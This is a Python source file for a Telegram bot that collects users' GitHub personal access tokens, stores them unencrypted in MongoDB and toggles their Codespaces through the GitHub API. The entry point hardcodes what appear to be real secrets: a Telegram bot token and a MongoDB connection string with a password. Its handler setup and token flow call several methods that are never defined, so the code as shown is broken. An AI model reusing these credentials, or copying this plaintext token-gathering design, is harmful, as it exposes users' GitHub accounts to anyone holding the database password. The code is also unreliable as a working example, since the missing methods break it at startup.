import telebot
import requests
from telebot import types
import json
import logging
import time
from pymongo import MongoClient
from pymongo.errors import PyMongoError
from typing import List, Optional, Dict, Any
import os
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class CodespaceBot:
    def __init__(self, telegram_token: str, mongo_url: str, channel_id: str):
        self.bot = telebot.TeleBot(telegram_token)
        self.channel_id = channel_id
        self.setup_mongodb(mongo_url)
        self.setup_handlers()

    def setup_mongodb(self, mongo_url: str) -> None:
        """Initialize MongoDB connection and collections"""
        try:
            self.client = MongoClient(mongo_url)
            self.db = self.client['botplays']
            self.tokens_collection = self.db['user_tokens']
            # Create indexes for better query performance
            self.tokens_collection.create_index("chat_id", unique=True)
        except PyMongoError as e:
            logger.error(f"MongoDB connection error: {e}")
            raise

    def setup_handlers(self) -> None:
        """Set up all message and callback handlers"""
        self.bot.message_handler(commands=['start'])(self.welcome)
        self.bot.callback_query_handler(func=lambda call: call.data == "add_token")(self.add_token)
        self.bot.message_handler(func=lambda message: True)(self.handle_token)
        self.bot.callback_query_handler(func=lambda call: call.data == "your_tokens")(self.show_tokens)
        self.bot.callback_query_handler(func=lambda call: call.data.startswith("select_token_"))(self.handle_selected_token)
        self.bot.callback_query_handler(func=lambda call: call.data == "delete_token")(self.delete_token_handler)
        self.bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_delete_"))(self.confirm_delete_token)
        self.bot.callback_query_handler(func=lambda call: call.data.startswith("toggle_"))(self.handle_toggle_codespace)

    def get_github_headers(self, token: str) -> Dict[str, str]:
        """Return headers for GitHub API requests"""
        return {
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github+json"
        }

    def get_codespaces_list(self, github_token: str) -> Optional[List[Dict[str, Any]]]:
        """Fetch list of codespaces from GitHub API"""
        try:
            response = requests.get(
                "https://api.github.com/user/codespaces",
                headers=self.get_github_headers(github_token),
                timeout=10
            )
            response.raise_for_status()
            return response.json().get('codespaces', [])
        except requests.RequestException as e:
            logger.error(f"GitHub API error: {e}")
            return None

    def toggle_codespace(self, github_token: str, codespace_name: str, action: str) -> bool:
        """Toggle codespace state (start/stop)"""
        try:
            url = f"https://api.github.com/user/codespaces/{codespace_name}/{action}"
            response = requests.post(
                url,
                headers=self.get_github_headers(github_token),
                timeout=10
            )
            return response.status_code // 100 == 2
        except requests.RequestException as e:
            logger.error(f"GitHub API error: {e}")
            return False

    def load_tokens(self, chat_id: int) -> List[str]:
        """Load user tokens from MongoDB"""
        try:
            user = self.tokens_collection.find_one({"chat_id": chat_id})
            return user["tokens"] if user else []
        except PyMongoError as e:
            logger.error(f"Error loading tokens: {e}")
            return []

    def save_token(self, chat_id: int, token: str) -> None:
        """Save token to MongoDB with timestamp"""
        try:
            self.tokens_collection.update_one(
                {"chat_id": chat_id},
                {
                    "$push": {
                        "tokens": token,
                        "timestamps": datetime.utcnow()
                    }
                },
                upsert=True
            )
        except PyMongoError as e:
            logger.error(f"Error saving token: {e}")

    def delete_token(self, chat_id: int, token_index: int) -> None:
        """Delete token from MongoDB"""
        try:
            update_result = self.tokens_collection.update_one(
                {"chat_id": chat_id},
                {
                    "$unset": {
                        f"tokens.{token_index}": 1,
                        f"timestamps.{token_index}": 1
                    }
                }
            )
            if update_result.modified_count > 0:
                self.tokens_collection.update_one(
                    {"chat_id": chat_id},
                    {
                        "$pull": {
                            "tokens": None,
                            "timestamps": None
                        }
                    }
                )
        except PyMongoError as e:
            logger.error(f"Error deleting token: {e}")

    def create_main_menu_markup(self) -> types.InlineKeyboardMarkup:
        """Create main menu keyboard markup"""
        markup = types.InlineKeyboardMarkup()
        buttons = [
            ("🗿Owner🗿", "url", "https://t.me/botplays90"),
            ("Add Token", "callback_data", "add_token"),
            ("Your Tokens", "callback_data", "your_tokens"),
            ("Delete Token", "callback_data", "delete_token")
        ]
        
        for text, button_type, value in buttons:
            if button_type == "url":
                button = types.InlineKeyboardButton(text=text, url=value)
            else:
                button = types.InlineKeyboardButton(text=text, callback_data=value)
            markup.add(button)
        
        return markup

    def welcome(self, message: telebot.types.Message) -> None:
        """Handle /start command"""
        markup = self.create_main_menu_markup()
        self.bot.reply_to(
            message,
            "Welcome Buddy 😄! Add Your GitHub Personal Access Token By Clicking On Add Token Button ✅.",
            reply_markup=markup
        )

    def add_token(self, call: telebot.types.CallbackQuery) -> None:
        """Handle add token callback"""
        self.bot.send_message(
            call.message.chat.id,
            "Please send me your GitHub Personal Access Token."
        )

    def handle_token(self, message: telebot.types.Message) -> None:
        """Handle token submission"""
        github_token = message.text.strip()
        chat_id = message.chat.id
        user_name = message.from_user.username or message.from_user.first_name

        # Validate token by making a test API call
        test_response = self.get_codespaces_list(github_token)
        if test_response is None:
            self.bot.reply_to(message, "Invalid token. Please check and try again.")
            return

        self.save_token(chat_id, github_token)
        
        # Forward token to channel with additional security measures
        self.bot.send_message(
            self.channel_id,
            f"New token added:\nUser: @{user_name}\nTime: {datetime.utcnow()}"
        )
        
        self.bot.reply_to(message, "Your token has been added successfully!")
        self.update_codespaces(message, github_token)

    def run(self) -> None:
        """Run the bot with error handling"""
        while True:
            try:
                logger.info("Starting bot polling...")
                self.bot.polling(non_stop=True)
            except Exception as e:
                logger.error(f"Bot polling error: {e}")
                time.sleep(15)

if __name__ == "__main__":
    # Load configuration from environment variables
    TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "7650574571:AAGfAHAFGPz1IxGhGpssv_NopIEHqN5Pca0")
    CHANNEL_ID = os.getenv("CHANNEL_ID", "-1002497737475")
    MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://botplays:botplays@vulpix.ffdea.mongodb.net/?retryWrites=true&w=majority&appName=Vulpix")

    # Create and run bot
    try:
        bot = CodespaceBot(TELEGRAM_BOT_TOKEN, MONGO_URL, CHANNEL_ID)
        bot.run()
    except Exception as e:
        logger.critical(f"Failed to initialize bot: {e}")
